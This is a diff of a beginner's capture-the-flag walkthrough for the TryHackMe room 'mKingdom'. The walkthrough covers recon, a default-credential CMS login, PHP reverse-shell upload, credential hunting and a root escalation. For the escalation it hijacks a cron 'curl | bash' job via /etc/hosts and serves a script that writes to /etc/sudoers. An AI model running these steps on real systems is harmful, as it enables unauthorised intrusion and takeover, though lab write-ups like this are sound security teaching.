@@ -3,7 +3,7 @@ layout: post
 title: mKingdom TryHackMe writeup for beginners with spoilerwarning
 ---
 
-mKingdom is advertised as an easy, beginner-friendly room, but I have some reservations about this claim. While standard methods will get you started, there are several rabbit holes that can mislead you. Although initial progress might seem straightforward, obtaining the user and especially the root flag can be quite challenging for beginners. I suspect this box may be reclassified as a medium difficulty in the future.
+[mKingdom](https://tryhackme.com/r/room/mkingdom) is advertised as an easy, beginner-friendly room, but I have some reservations about this claim. While standard methods will get you started, there are several rabbit holes that can mislead you. Although initial progress might seem straightforward, obtaining the user and especially the root flag can be quite challenging for beginners. I suspect this box may be reclassified as a medium difficulty in the future.
 
 ___
 
@@ -18,9 +18,9 @@ This first step should be very obvious when you start. Start the machine and Nma
 
 I always start by scanning all ports to avoid missing any services running on uncommon ports:
 
-``
+```bash
 nmap -sS -p 1-65535 10.10.226.51
-``
+```
 
 ![alt text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/mkingdom/nmap1.png)
 
@@ -28,9 +28,9 @@ We see only an HTTP server running on port 85, which is not the standard port 80
 
 If your machine returns an open port, you can still gather more information about this webserver with the following command:
 
-``
+```bash
 nmap -sC -sV -Pn 10.10.226.51 -p 85
-``
+```
 
 **It will reveal that the server is running on ```Apache httpd 2.4.7 ((Ubuntu))``` and we get a suspicious http-title....
 
@@ -41,15 +41,15 @@ ___
 # Webserver Enumeration
 I always add the server IP to my ```/etc/hosts``` file and I recomment you doing the same:
 
-``
+```bash
 sudo nano /etc/hosts
-``
+```
 
 And add this line to your hosts (change the IP to your target machine address!)
 
-``
+```bash
 10.10.226.51    mkingdom.thm
-``
+```
 
 When navigating in your web browser to ```http://mkingdom.thm:85/```. you should see the following page. It looks like the main page was defaced, so we need to find another way into the main website.
 
@@ -60,8 +60,6 @@ When navigating in your web browser to ```http://mkingdom.thm:85/```. you should
   If you said to do a directory scan, you are not wrong. However, it is always a good idea to look at the source code first, especially on a defaced website. You might find your powerstar just there.
 
   For this room, there isn't much in the source code. We see that the loaded image is located in the root of the webserver, which doesn't help much. So, we need to perform a directory busting (dirbusting) scan.
-
-  ![alt_text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/mkingdom/sourcecode1.png)
  
 </details>
 
@@ -71,15 +69,15 @@ ___
 
 We run Gobuster to find any directories. I like to start with a small wordlist first, and if it comes up empty, I do an extension search:
 
-``
+```bash
 gobuster dir -u http://mkingdom.thm:85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-``
+```
 
 We find one directory immediately. If you let the full scan run, it doesn't show anything else. 
 
-``
+```bash
 /app                  (Status: 301) [Size: 312] [--> http://mkingdom.thm:85/app/]
-``
+```
 
 When we open this web folder, we only see a green button with ```JUMP``` on it. Clicking it will redirect us to the main page. (Don't forget to look at the source code as well! But still nothing interesting.)
 
@@ -89,11 +87,7 @@ ___
 
 <details>
    <summary>There are a few things we can check now. Can you think about them all? Click here if you want a hint</summary>
-   In total, there are three things I checked:
-   
-   1. What you should already have checked twice in this room if you followed my instructions.
-   2. That search bar is intressting.
-   3. Checking every link on the page (dirbusting only led you down a rabbit hole).
+   In total, there are three things I checked: What you should already have checked twice in this room if you followed my instructions. Also, that search bar is intressting. and Checking every link on the page (dirbusting only led you down a rabbit hole).
 </details>
 
 ![alt_text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/think.png)
@@ -120,15 +114,9 @@ ___
    
  Secondly I tried to just search for /etc/passwd, but the results were empty. Then, I tried injecting it directly into the URL bar, but still without any result. I tried adding multiple ../ in front of it and ran a custom script to inject multiple payloads automatically. All results were empty.
 
-I also tried to inject the search_path parameter. I was not sure what the ``[]`` symbols did in the parameter and could not find much information about it on the internet. I changed it to ``_search_path[/]=&query=/var/www/html/index.html_`` to see if I could set the root of the search path to the root of the system. It did not work and was probably also not going to work like this if the search bar was vulnerable.
+I also tried to inject the search_path parameter. I was not sure what the [] symbols did in the parameter and could not find much information about it on the internet. I changed it to _search_path[/]=&query=/var/www/html/index.html_ to see if I could set the root of the search path to the root of the system. It did not work and was probably also not going to work like this if the search bar was vulnerable.
 
-Then, I tried some common SQL injection (SQLi) commands, in case the search function was handled by a SQL database. No payloads worked. I captured the POST packet, saved it to a file, and ran it through sqlmap:
-
-``
-sqlmap -r request.txt
-``
-
-sqlmap gave back no parameters where injectable, so after all this I came to the comclusion the search bar could not be exploited.
+Then, I tried some common SQL injection (SQLi) commands, in case the search function was handled by a SQL database. No payloads worked. I captured the POST packet, saved it to a file, and ran it through sqlmap. Sqlmap gave back no parameters where injectable, so after all this I came to the comclusion the search bar could not be exploited.
 
 </details>
 
@@ -167,10 +155,10 @@ ___
 
 But then I remembered that this box is labeled as easy, and people in the Discord were getting past it with very little effort. I had to think less hard and fall back on the most basic form of login. I tried the most default of default credentials.
 
-``
+```bash
 admin admin.... WRONG!
-admin password.... CORRECT!
-``
+admin pa____rd.... CORRECT! (can you guess the full password?)
+```
 
 I hit my wall out of frustration and went on to upload my PHP shell.
 
@@ -178,9 +166,9 @@ I hit my wall out of frustration and went on to upload my PHP shell.
 
 Because the webserver is the only service running on the machine, the PHP shell will be my only way to control the machine. I generated a [PHP Pentestmonkey reverse shell](https://www.revshells.com/), saved it and looked again at [the guide from earlier](https://vulners.com/hackerone/H1:768322). It's not that hard to do. Just follow the guide, and you will have your shell up in no time (don't forget to whitelist the php extention under ```System & Setting > Files > Allowed File Types```). When uploading the file, click on close when the bar under the uploaded shell turns green. Start a netcat listener and click the link after you uploaded your shell.
 
-``
+```bash
 ncat -lvnp 8888 (or any other Lport you want to use. Make sure it is the same as in your php shell script!)
-``
+```
 
 ![alt_text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/mkingdom/shell_link.png)
 
@@ -188,16 +176,16 @@ ___
 
 Now that we have access, we need to stabilize the shell. In your Netcat listener, copy and paste the following lines:
 
-``
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
-``
+```
 
 Next, hit 'Ctrl + Z' to put the Netcat listener in the background (don't worry, it is still running, but you need to paste the following command in your own terminal on the same window that Netcat is running):
 
-``
+```bash
 stty raw -echo; fg
-``
+```
 
 Hit 'Enter' twice and now we have a shell that mimics all the nice functionalities of a normal terminal window. Time to enumerate the system and see if we can escalate our privileges to a user. Good luck!
 
@@ -210,12 +198,12 @@ As a ```www-data``` user, we have very limited privileges and are often restrict
 
 ![alt_text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/mkingdom/counter_ls.png)
 
-``
+```bash
 cd /var/www/html/app/castle/application
 cat counter.sh
 #!/bin/bash
 echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."
-``
+```
 
 ___
 
@@ -225,23 +213,23 @@ I ran [```linpeas.sh```](https://github.com/peass-ng/PEASS-ng/tree/master/linPEA
 
 On attacker machine:
 
-``
+```bash
 cp linpeas.sh linpeas.txt
-``
+```
 
 Upload this ```linpeas.txt``` file to the webserver, and on the victim machine do:
 
-``
+```bash
 cd /var/www/html/app/castle/application/files/path/to/linpeas_folder/
 mv linpeas.txt linpeas.sh
 /bin/bash linpeas.sh > peas.txt
-``
+```
 
 This will take a minute. Wait, then download the ```peas.txt``` file on the attacker machine:
 
-``
+```bash
 wget http://mkingdom.thm:85/app/castle/application/files/path/to/peas.txt
-``
+```
 
 You can also view the output on the victim machine, but I like to have the ```linpeas``` output open in a separate terminal window.
 
@@ -251,9 +239,9 @@ Linpeas generates a big file with a lot of information. Use ```cat``` to display
  <summary>Need a hint?</summary>
  One output is marked in yellow and should be easy to find. The other one is very valuable. You can try the following command for a more focused search:
  
- ``
+ ```bash
  cat peas.txt | grep password -n
- ``
+ ```
  
  This will give you output with line numbers. If you see something interesting, you can use ```cat -n peas.txt``` to display the whole file with line numbers, allowing you to easily navigate to the line you want to know more about.
 </details>
@@ -270,19 +258,19 @@ The two findings I find interesting are the password to the ```MySQL``` database
 
  once played around with a MySQL server on my website and made the mistake of using the same password for the database as for my user account! This database password is stored in plain text and can compromise your system very easily if you do this. But for how foolish I was that time, I will use this now to my advantage and try this password on the toad user (this user was also found by ```linpeas```).
 
-``
+```bash
 su toad
-Password: toadisthebest
-``
+Password: <found password>
+```
 
 And we are now a user on the system! Let's get that user flag shall we?
 
-``
+```bash
 cd ~
 ls -la
-``
+```
 
-``
+```bash
 total 100
 drwxrwx--- 16 toad toad 4096 Jan 29 17:53 .
 drwxr-xr-x  4 root root 4096 Jun  9  2023 ..
@@ -310,15 +298,15 @@ drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Videos
 -rw-------  1 toad toad   57 Dec 10  2023 .Xauthority
 -rw-------  1 toad toad 1676 Dec 10  2023 .xsession-errors
 -rw-------  1 toad toad 1675 Nov 30  2023 .xsession-errors.old
-``
+```
 
 Hmm... no userflag here. But we do have an ```smb.txt``` file. There doesn't seem to be an SMB server running on this system, but maybe we need to find another system?
 
-``
+```bash
 cat smb.txt
-``
+```
 
-``
+```bash
 Save them all Mario!
 
                                       \| /
@@ -344,24 +332,24 @@ Save them all Mario!
  SS    SS SS SS       |   |
  SS    SS SS SS       `==='
 SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
-``
+```
 
 Well, that is some nice ASCII art, Toad, but it does not help us at all! Let's check out that ```/bin/cat``` file we found:
 
-``
+```bash
 toad@mkingdom:~$ ls -la /bin/cat
 -rwsr-xr-x 1 toad root 47904 Mar 10  2016 /bin/cat
-``
+```
 
 It seems we own this file, and it is part of the root group. What a weird way to configure a program like that! Let's check [GTFOBins](https://gtfobins.github.io/gtfobins/cat/) to see what this can do for us.
 
 It says we might be able to use the SUID bit that was set and elevate privileges to root. However, the code block shows we need to run the install command as sudo. We should first check if we have that privilege before trying this; otherwise, it might trigger a report that we tried to sudo without sudo privileges (not that it matters in a room like this, but let's not make rookie mistakes now).
 
-``
+```bash
 toad@mkingdom:~$ sudo -l
 [sudo] password for toad:              
 Sorry, user toad may not run sudo on mkingdom.
-``
+```
 
 Dang it! Seems this is not the way to go. Let's now enumerate further. You are a regular user now after all and there might be some more information in the ```/home/toad``` folder. Try to find the information yourself first!
 
@@ -380,17 +368,16 @@ export PWD_token='aWthVGVOVEFOdEVTCg=='
 
 This finding was also found by ```linpeas``` if you look near the top of the ```peas.txt``` file. PWD sounds a lot like password. This terminal loads the given value to the environment variable named PWD_token. We can call it to see if it is still the same value.
 
-``
+```bash
 toad@mkingdom:~$ echo $PWD_token
 aWthVGVOVEFOdEVTCg==
-``
+```
 
 Yup, it is the same. The two ```==``` symbols indicate this string of letters is encoded in ```base64```. ```Base64``` takes three characters and encodes them into four characters. When a string is not a multiple of three, it uses the ```=``` character at the end as padding to fill up leftover bytes. This way the message can be correctly decoded. Let's decode it now.
 
-``
+```bash
 toad@mkingdom:~$ echo $PWD_token | base64 --decode
-ikaTeNTANtES
-``
+```
 
 We got something that looks like a possible password. But if you try to use this to log in as the root user, it fails. What other user could this be for?
 
@@ -398,30 +385,30 @@ We got something that looks like a possible password. But if you try to use this
 
 This one should not be that hard. If you cd to the ```home``` directory, you find another user there named mario.
 
-``
+```bash
 toad@mkingdom:~$ cd /home
 toad@mkingdom:/home$ ls
 mario  toad
-``
+```
 
 Let's try login in with our new password to the mario user
 
-``
+```bash
 toad@mkingdom:/home$ su mario
 Password: 
 mario@mkingdom:/home$
-``
+```
 
 And we are ```mario``` now! We are getting further and further into the system. We are running a PHP shell, that spawned a shell for the ```toad``` user, that spawned a shell for the ```mario``` user. Incredible, right? Let's see if Mario has the user flag in his ```home``` folder:
 
-``
+```bash
 mario@mkingdom:/home$ cd
 mario@mkingdom:~$ ls
 Desktop    Downloads  Pictures  Templates  Videos
 Documents  Music      Public    user.txt
 mario@mkingdom:~$ cat user.txt
 cat: user.txt: Permission denied
-``
+```
 
 Well he does, but we cannot use ```cat```, because it is owned by the ```toad``` user. However, we can use ```tac```, which is litterally the reverse of ```cat```. ```cat``` will return every single line from a file top to buttom. ```tac``` does it buttom-up. Because the ```user.txt``` file contains only one line, it does the same thing as the ```cat``` command in our case.
 
@@ -447,33 +434,33 @@ User mario may run the following commands on mkingdom:
 
 We have sudo privileges to run id, but that one is useless for us (you can check [GTFOBins](https://gtfobins.github.io/) and see that it is not exploitable). The only thing it does is giving us a fake root id when we run it.
 
-``
+```bash
 mario@mkingdom:~$ sudo id
 uid=0(root) gid=0(root) groups=0(root)
-``
+```
 
 It's nothing more than a police ID badge you bought at your local toy shop. Now we need to look for that ```counter.sh``` program somewhere in the processes. We will do this by monitoring all PID events live with [pspy](https://github.com/DominicBreuker/pspy).
 
 First, check if the system is a 64bit or 32bit OS
 
-``
+```bash
 mario@mkingdom:~$ uname -a
 Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
-``
+```
 
 The last few words show this is a 64-bit system. We will download the **static version** of the [```pspy64```](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) binary to your attacker machine. Don't sweat the build process in Docker. We can run this binary directly as it is.
 
 Now, start a Python webserver from the folder you downloaded this file to.
 
-``
+```bash 
 ─[user@parrot]─[~/scripts/privesc/pspy]
 └──╼ $python3 -m http.server 5555
 Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
-``
+```
 
 Go to the victim machine and download the ```pspy64``` binary onto the system. Then give the binary executing privileges with ```chmod +x pspy64```. Then run it with ```./pspy64 -pf -i 1000```. If you see the ```pspy``` logo, everything is running fine. At the beginning, it will show every process that is running. Let it run for a bit and then it will only capture new processes that are started. We are looking for processes that are colored, so not white. See if you can find the right process for yourself!
 
-``
+```bash
 mario@mkingdom:~$ wget 10.xx.xx.xxx:5555/pspy64
 --2024-06-16 16:10:24--  http://10.xx.xx.xxx:5555/pspy64
 Connecting to 10.xx.xx.xxx:5555... connected.
@@ -508,28 +495,28 @@ done
 2024/06/16 16:10:48 CMD: UID=33    PID=4675   | /usr/sbin/apache2 -k start 
 2024/06/16 16:10:48 CMD: UID=33    PID=4674   | /usr/sbin/apache2 -k start 
 
-``
+```
 
 ![alt_text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/think.png)
 
 
 One second after a full minute, a lot of processes spawn. One block in blue is interesting:
 
-``
+```bash
 2024/06/16 16:11:01 CMD: UID=0     PID=1375   | bash 
 2024/06/16 16:11:01 CMD: UID=0     PID=1374   | curl mkingdom.thm:85/app/castle/application/counter.sh 
 2024/06/16 16:11:01 CMD: UID=0     PID=1373   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
 2024/06/16 16:11:01 CMD: UID=0     PID=1372   | CRON 
-``
+```
 
 A ```curl``` process is started by the crontab to get the ```counter.sh``` script from the server. Cron or cronjobs are automated process calls on a specific timing. Handy for periodic updates for example. After that, it is run and logged to a file. Let's check out the content of that log file:
 
-``
+```bash
 mario@mkingdom:~$ tac /var/log/up.log
 There are 39882 folder and files in TheCastleApp in - - - - > Sun Jun 16 16:43:02 EDT 2024.
 There are 39882 folder and files in TheCastleApp in - - - - > Sun Jun 16 16:42:01 EDT 2024.
 There are 39882 folder and files in TheCastleApp in - - - - > Sun Jun 16 16:41:01 EDT 2024.
-``
+```
 
 It is clear this script is being executed every minute. If you remember from earlier, this file is root-owned. If we could somehow replace the content of ```counter.sh```, it will execute as the root user! But we need to find a solution for two problems:
 
@@ -549,14 +536,14 @@ Back to me visiting you. I can hold an addressbook to store your address. That w
 
 We are on a Linux machine. The hosts and their corresponding IP addresses are stored in the ```/etc/hosts``` file. Let's see who owns this file
 
-``
+```bash
 mario@mkingdom:~$ ls -la /etc/hosts
 -rw-rw-r-- 1 root mario 342 Jan 26 19:53 /etc/hosts
-``
+```
 
 Well, would you look at that! root is the owner, but users in the mario group can also edit these files. That's-a-me! Let's open the file with ```nano``` to edit it
 
-``
+```bash
 27.0.0.1       localhost
 127.0.1.1       mkingdom.thm
 127.0.0.1       backgroundimages.concrete5.org
@@ -569,48 +556,48 @@ fe00::0 ip6-localnet
 ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-``
+```
 
 We see it uses 127.0.1.1 as the IP address for ```mkingdom.thm```, which is a loopback address. This address is used to connect right back to the machine itself. If the admin just used the ip address instead of the hostname, this attack would not be possible.
 
 Change the IP address to your own IP address on the TryHackMe vpn. Leave one tab between the IP address and the hostname.
 
-``
+```bash
 127.0.0.1       localhost
 10.x.x.x        mkingdom.thm
 127.0.0.1       backgroundimages.concrete5.org
 127.0.0.1       www.concrete5.org
-``
+```
 
 Hit ```Ctrl+X```, ```Y``` and ```Enter```. This will save the file. Restart they python webserver on port 85 on your attacker machine. We need to listen on this port, because the cron
 
-``
+```bash
 python3 -m http.server 5555
-``
+```
 
 If you did it correctly, you should see failed connection attempts on the webserver (because the ```counter.sh``` file does not yet exist on our webserver)
 
-``
+```bash
 ┌─[user@parrot]─[~]
 └──╼ $sudo python3 -m http.server 85
 Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
 10.10.78.1 - - [16/Jun/2024 21:34:01] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
-``
+```
 
 There we go. The root user is desprite to get hacked! But we need the file in the specific folder that is being called. So lets do that with the ```mkdir``` command. Navigate the the last folder. I choose to append sudo rights for mario to execute ```/bin/bash```.
 
-``
+```bash
 ┌─[user@parrot]─[~/app/castle/application]
 └──╼ $echo "echo 'mario   ALL=(ALL) /bin/bash' >> /etc/sudoers" > counter.sh
-``
+```
 
 We wait a bit and then try to drop a root shell
 
-``
+```bash
 mario@mkingdom:~$ sudo /bin/bash
 [sudo] password for mario:             
 root@mkingdom:~#
-``
+```
 
 It worked! Lets get that final flag!
 ![alt_text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/mkingdom/root_flag.png)
